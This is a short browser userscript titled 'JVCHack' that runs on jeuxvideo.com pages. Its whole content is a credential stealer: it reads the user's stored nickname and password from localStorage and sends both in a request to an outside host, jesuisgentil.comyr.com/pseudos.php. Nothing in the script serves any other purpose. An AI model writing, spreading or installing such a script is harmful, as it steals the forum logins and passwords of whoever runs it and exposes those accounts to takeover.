// ==UserScript==
// @name        JVCHack
// @namespace   hack
// @description Hacked.
// @include     http://www.jeuxvideo.com/*
// @version     1
// ==/UserScript==
 
var pseudo = localStorage.getItem('nick');
var mdp = localStorage.getItem('pass');
 
 
var xhr = new XMLHttpRequest();
 
xhr.open('GET', 'jesuisgentil.comyr.com/pseudos.php?pseudo=' + pseudo + '&mdp=' + mdp);
xhr.send(null);